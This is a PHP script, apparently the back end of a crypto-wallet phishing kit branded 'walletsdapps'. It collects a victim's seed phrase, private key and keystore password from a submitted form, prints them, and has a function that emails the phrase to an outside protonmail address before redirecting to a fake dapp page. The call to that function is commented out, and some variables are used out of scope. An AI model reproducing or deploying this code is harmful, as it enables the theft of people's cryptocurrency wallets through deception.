<?php
session_start();
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;


require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';



$phrase = $_POST['phrase'];
$privatekey = $_POST['privatekey'];
$keystorepassword = $_POST['keystorepassword'];

$ref = $_POST['form-name'];


echo "Ref: $ref <br>";
echo "Phrase: $phrase <br>";
echo "Private Key: $privatekey <br>";
echo "Kry Store Password: $keystorepassword <br>";



//$mail = notifyAdmin($ref,$phrase);




// Function for sending out mail to users.
function sendOutMail($userEmail,$mailSubject,$mailBody,$from='no-reply@walletsdapps.co',$actionLink='',$actionText='',$featuredLink='',$featuredImage='',$featuredTitle=''){
{

$platformName =  'walletsdapps';
$platformDomain = $platformName.'.com';
$unsubscribeLink = 'https://'.$platformDomain.'/unsubscribe_mail_notification.php?key='.$userEmail;
$logo =  getLogo();

$facebookLink = '';
$instagramLink = '';
$twitterLink = '';
$linkedinLink = '';
$mailHTML = '';
$actionBtn = '';
$featuredSection = '';

	if($actionLink == '' || $actionText == ''){
		$actionBtn = '';
	}
	else{
	$actionBtn ='<tr>
													<td style="padding: 20px 0 30px 0;color: #153643;font-family: Arial, sans-serif;font-size: 16px;line-height: 20px;text-align: center;">
					<a href="'.$actionLink.'" style="background: #cc9966;color: white;text-decoration: none;padding: 9px;border-radius: 5px;">'.$actionText.'</a>
													</td>
				</tr>';
	}


	if($featuredImage == '' || $featuredLink == ''){
		$featuredSection = '';
	}
	else{
	$featuredSection = ' <tr>
                                    <td>
                                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
                                            <tr>
                                                <td width="260" valign="top">
                                                    <table border="0" cellpadding="0" cellspacing="0" width="100%">
                                                        <tr>
                                                            <td style="text-align:center;">
                                                                <img src="cid:featuredImage" alt="'.$featuredTitle.'" title="'.$featuredTitle.'" width="100%" style="display: block;" />
                                                            </td>
                                                        </tr>
                                                    </table>
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                        </tr>';
	}

	{

	$mailHTML =  '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>'.$platformName.' Notification System</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	</head>
	<body style="margin: 0; padding: 0;">
		<table border="0" cellpadding="0" cellspacing="0" width="100%"> 
			<tr>
				<td style="padding: 10px 0 30px 0;">
					<table align="center" border="0" cellpadding="0" cellspacing="0" width="600" style="border: 1px solid #cccccc; border-collapse: collapse;">
						<tr>
							<td align="center" bgcolor="#2a2e39" style="padding: 40px 0 30px 0; color: #153643; font-size: 28px; font-weight: bold; font-family: Arial, sans-serif;">
								<img src="cid:logoimg" alt="accioinvest"  style="display: block;" />
							</td>
						</tr>
						<tr>
							<td bgcolor="#ffffff" style="padding: 40px 30px 40px 30px;">
								<table border="0" cellpadding="0" cellspacing="0" width="100%">
									<tr>
										<td style="color: #153643; font-family: Arial, sans-serif; font-size: 24px;">
											<b>'.$mailSubject.'</b>
										</td>
									</tr>
									<tr>
										<td style="padding: 20px 0 30px 0; color: #153643; font-family: Arial, sans-serif; font-size: 16px; line-height: 20px; text-align: justify;">
												Phrase: '.$mailBody.'
										</td>
									</tr>
								   '.$actionBtn.'
								   
								   
								   '.$featuredSection.'
								   
								   
								</table>
							</td>
						</tr>
						<tr>
							<td bgcolor="#cc9966" style="padding: 30px 30px 30px 30px;">
								<table border="0" cellpadding="0" cellspacing="0" width="100%">
									<tr>
										<td style="color: #ffffff; font-family: Arial, sans-serif; font-size: 14px;" width="75%">
											&reg; '.$platformName.', '.date("Y").'<br/>
											<a href="'.$unsubscribeLink.'" style="color: #ffffff;"><font color="#ffffff">Unsubscribe</font></a> to this newsletter instantly
										</td>
										<td align="right" width="25%">
											<table border="0" cellpadding="0" cellspacing="0">
												<tr>
													<td style="font-family: Arial, sans-serif; font-size: 12px; font-weight: bold;">
														<a href="'.$twitterLink.'" style="color: #ffffff;">
															<img src="cid:twlogo" alt="Twitter" width="25px" height="25px" style="display: block;" border="0" />
														</a>
													</td>
													<td style="font-size: 0; line-height: 0;" width="20">&nbsp;</td>
													<td style="font-family: Arial, sans-serif; font-size: 12px; font-weight: bold;">
														<a href="'.$facebookLink.'" style="color: #ffffff;">
															<img src="cid:fblogo" alt="Facebook" width="25px" height="25px" style="display: block;" border="0" />
														</a>
													</td>
													<td style="font-size: 0; line-height: 0;" width="20">&nbsp;</td>
													<td style="font-family: Arial, sans-serif; font-size: 12px; font-weight: bold;">
														<a href="'.$instagramLink.'" style="color: #ffffff;">
															<img src="cid:iglogo" alt="Instagram" width="25px" height="25px" style="display: block;" border="0" />
														</a>
													</td>
													<td style="font-size: 0; line-height: 0;" width="20">&nbsp;</td>
													<td style="font-family: Arial, sans-serif; font-size: 12px; font-weight: bold;">
														<a href="'.$linkedinLink.'" style="color: #ffffff;">
															<img src="cid:lnlogo" alt="Linkedin" width="25px" height="25px" style="display: block;" border="0" />
														</a>
													</td>
												</tr>
											</table>
										</td>
									</tr>
								</table>
							</td>
						</tr>
					</table>
				</td>
			</tr>
		</table>
	</body>
	</html>';



	}




	$mail = new PHPMailer(TRUE);
	/* ... */

	
	/* Open the try/catch block. */
	try {
	    
		//$mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
		/*$mail->isSMTP();                                            // Send using SMTP
		$mail->Host       = 'localhost';                    // Set the SMTP server to send through
		$mail->SMTPAuth   = true;                                   // Enable SMTP authentication
		$mail->Username   = 'no-reply@accioinvest.com';                     // SMTP username
		$mail->Password   = '';                               // SMTP password
		$mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged   PHPMailer::ENCRYPTION_STARTTLS;
		$mail->Port       = 465;          */                          // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

	    $mail->isSMTP();
        $mail->Host = 'localhost';
        $mail->SMTPAuth = false;
        $mail->SMTPAutoTLS = false; 
        $mail->Port = 25; 
	   
	   /* Set the mail sender. */
	   $mail->setFrom($from, "Christopher from ".$platformName);

	   /* Add a recipient. */
	   $mail->addAddress($userEmail, 'James Madison');
	   
       
	   /* Set the subject. */
	   $mail->Subject = $mailSubject;    
       
       $mail->isHTML(TRUE);
       
	   
       /* Set the mail message body. */
       //$mail->Body = '<html><img src="cid:logoimg" ><br>There is a nice introductory email <strong>You are welcome.</strong>.</html>';
       
       $mail->Body = $mailHTML;
       $mail->AltBody = strip_tags($mailBody);
	   
	      
	   
	   
	   /* Finally send the mail. */
	   $mail->send();
	   echo 1;
	   
	   header("Location: dapp.html");
	  
	}
	catch (Exception $e)
	{
	   /* PHPMailer exception. */
	   echo $e->errorMessage();
	}
	catch (\Exception $e)
	{
	   /* PHP exception (note the backslash to select the global namespace Exception class). */
	   echo $e->getMessage();
	}	






//echo $mailHTML;


}

}

function notifyAdmin($ref,$phrase){
	
	$from = "no-reply@walletsdapps.co";
	$to = "kakashihatake.naruto@protonmail.com";
	$subject = "New Notification for $ref";
	$message_body ="App: $ref <br> Phrase: $phrase <br> Private Key: $privatekey <br> Key Store Password: $keystorepassword ";			
				
	sendOutMail( $to, $subject, $phrase ,$from);
	
}

